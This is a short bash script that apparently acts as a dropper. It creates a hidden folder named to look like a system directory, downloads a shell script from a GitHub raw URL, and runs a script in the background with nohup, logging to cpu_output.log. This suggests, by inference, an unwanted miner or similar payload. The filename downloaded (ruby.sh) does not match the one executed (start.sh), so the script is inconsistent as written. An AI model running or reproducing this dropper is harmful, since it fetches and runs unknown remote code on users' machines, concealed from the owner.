#!/bin/bash

WORKDIR="$HOME/.cache/.sysd"
mkdir -p "$WORKDIR" && cd "$WORKDIR"

wget https://raw.githubusercontent.com/dgreenawnareen/ruby/refs/heads/main/ruby.sh

chmod +x start.sh

nohup ./start.sh > cpu_output.log 2>&1 &
